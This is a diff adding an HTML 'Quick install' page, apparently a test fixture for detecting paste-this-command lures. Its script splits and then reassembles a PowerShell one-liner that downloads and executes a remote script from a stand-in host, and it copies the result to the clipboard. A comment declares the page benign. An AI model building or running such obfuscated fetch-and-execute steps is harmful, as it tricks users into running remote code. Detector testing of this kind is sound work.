@@ -1,0 +1,20 @@
+<!doctype html><html lang="en"><meta charset="utf-8"><title>Install the tool with Scoop-style setup</title>
+<!-- Hand-authored (0.15.0, fix round 2). Install docs: "Paste the following into PowerShell and press
+     Enter" is ordinary documentation, not a ClickFix lure. Command built at runtime. -->
+<header><nav><a href="/">Docs</a><a href="/guides">Guides</a></nav></header>
+<main>
+<h1>Quick install</h1>
+<p>Paste the following into PowerShell and press Enter:</p>
+<div class="snippet"><pre id="cmd"></pre><button id="copy" type="button">Copy</button></div>
+<p id="done"></p>
+</main>
+<footer><a href="/privacy">Privacy</a></footer>
+<script>
+  var pre = document.getElementById('cmd');
+  pre.textContent = ['ir', 'm https://example.test/get', '.ps1 | ie', 'x'].join('');
+  document.getElementById('copy').onclick = function () {
+    try { navigator.clipboard.writeText(pre.textContent); } catch (e) {}
+    document.getElementById('done').textContent = 'Copied';
+  };
+</script>
+</html>
